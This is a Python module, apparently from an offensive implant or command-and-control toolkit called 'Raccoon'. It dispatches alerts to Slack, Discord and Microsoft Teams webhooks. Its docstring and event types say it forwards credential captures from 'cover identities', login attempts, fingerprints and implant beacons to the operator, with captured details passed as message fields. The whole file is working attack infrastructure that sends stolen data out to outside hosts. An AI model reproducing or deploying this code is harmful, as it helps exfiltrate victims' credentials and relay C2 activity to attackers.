#!/usr/bin/env python3
"""
Notification dispatcher — sends alerts to Slack, Discord, and/or Microsoft Teams webhooks.
Used by cover identities (credential captures), watchdog (health), and C2 events.
"""

import json
import logging
import threading
import time
from datetime import datetime, timezone
from typing import Optional

import requests

logger = logging.getLogger("raccoon.notify")

_instance: Optional["Notifier"] = None


def get_notifier() -> Optional["Notifier"]:
    return _instance


def init_notifier(config: dict) -> "Notifier":
    global _instance
    _instance = Notifier(config)
    return _instance


class Notifier:
    def __init__(self, config: dict):
        notify_cfg = config.get("notifications", {})
        self.enabled = notify_cfg.get("enabled", False)

        self.slack_url = notify_cfg.get("slack", {}).get("webhook_url", "")
        self.slack_enabled = notify_cfg.get("slack", {}).get("enabled", False) and bool(self.slack_url)

        self.discord_url = notify_cfg.get("discord", {}).get("webhook_url", "")
        self.discord_enabled = notify_cfg.get("discord", {}).get("enabled", False) and bool(self.discord_url)

        self.teams_url = notify_cfg.get("teams", {}).get("webhook_url", "")
        self.teams_enabled = notify_cfg.get("teams", {}).get("enabled", False) and bool(self.teams_url)

        self._queue: list[dict] = []
        self._lock = threading.Lock()
        self._running = False
        self._thread: Optional[threading.Thread] = None

        if self.enabled and (self.slack_enabled or self.discord_enabled or self.teams_enabled):
            self._start_dispatcher()

    def _start_dispatcher(self):
        self._running = True
        self._thread = threading.Thread(target=self._dispatch_loop, daemon=True, name="notifier")
        self._thread.start()

    def _dispatch_loop(self):
        while self._running:
            with self._lock:
                batch = list(self._queue)
                self._queue.clear()

            for msg in batch:
                try:
                    if self.slack_enabled:
                        self._send_slack(msg)
                    if self.discord_enabled:
                        self._send_discord(msg)
                    if self.teams_enabled:
                        self._send_teams(msg)
                except Exception as e:
                    logger.debug("Notification send error: %s", e)

            time.sleep(2)

    def _send_slack(self, msg: dict):
        event = msg.get("event", "unknown")
        text = msg.get("text", "")
        details = msg.get("details", {})
        ts = msg.get("timestamp", datetime.now(timezone.utc).isoformat())

        icon = {
            "credential": ":key:",
            "login_attempt": ":lock:",
            "health_fail": ":warning:",
            "health_ok": ":white_check_mark:",
            "beacon": ":satellite:",
            "connection": ":electric_plug:",
        }.get(event, ":bell:")

        blocks = [f"{icon} *{text}*", f":clock1: `{ts}`"]
        for k, v in details.items():
            blocks.append(f"*{k}:* `{v}`")

        payload = {"text": "\n".join(blocks)}

        resp = requests.post(
            self.slack_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        if resp.status_code != 200:
            logger.debug("Slack error: %d %s", resp.status_code, resp.text)

    def _send_discord(self, msg: dict):
        event = msg.get("event", "unknown")
        text = msg.get("text", "")
        details = msg.get("details", {})
        ts = msg.get("timestamp", datetime.now(timezone.utc).isoformat())

        color = {
            "credential": 0xFF4444,
            "login_attempt": 0xFF8800,
            "health_fail": 0xFFAA00,
            "health_ok": 0x44BB44,
            "beacon": 0x4488FF,
            "connection": 0x8844FF,
        }.get(event, 0x888888)

        fields = [{"name": k, "value": f"`{v}`", "inline": True} for k, v in details.items()]

        embed = {
            "title": text,
            "color": color,
            "fields": fields,
            "timestamp": ts,
            "footer": {"text": "Raccoon Implant"},
        }

        payload = {"embeds": [embed]}

        resp = requests.post(
            self.discord_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        if resp.status_code not in (200, 204):
            logger.debug("Discord error: %d %s", resp.status_code, resp.text)

    def _send_teams(self, msg: dict):
        event = msg.get("event", "unknown")
        text = msg.get("text", "")
        details = msg.get("details", {})
        ts = msg.get("timestamp", datetime.now(timezone.utc).isoformat())

        color = {
            "credential": "FF4444",
            "fingerprint": "FF8800",
            "login_attempt": "FF8800",
            "health_fail": "FFAA00",
            "health_ok": "44BB44",
            "beacon": "4488FF",
            "connection": "8844FF",
        }.get(event, "888888")

        facts = [{"name": k, "value": f"`{v}`"} for k, v in details.items()]
        facts.insert(0, {"name": "Time", "value": ts})

        payload = {
            "type": "message",
            "attachments": [
                {
                    "contentType": "application/vnd.microsoft.card.adaptive",
                    "content": {
                        "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
                        "type": "AdaptiveCard",
                        "version": "1.4",
                        "body": [
                            {
                                "type": "Container",
                                "style": "emphasis",
                                "items": [
                                    {
                                        "type": "TextBlock",
                                        "text": f"\U0001f3af {text}",
                                        "weight": "Bolder",
                                        "size": "Medium",
                                        "wrap": True,
                                    }
                                ],
                            },
                            {
                                "type": "FactSet",
                                "facts": facts,
                            },
                        ],
                    },
                }
            ],
        }

        resp = requests.post(
            self.teams_url,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        if resp.status_code not in (200, 202):
            logger.debug("Teams error: %d %s", resp.status_code, resp.text)

    def notify(self, event: str, text: str, **details):
        """Queue a notification. Non-blocking, fire-and-forget."""
        if not self.enabled:
            return
        msg = {
            "event": event,
            "text": text,
            "details": details,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        with self._lock:
            self._queue.append(msg)

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
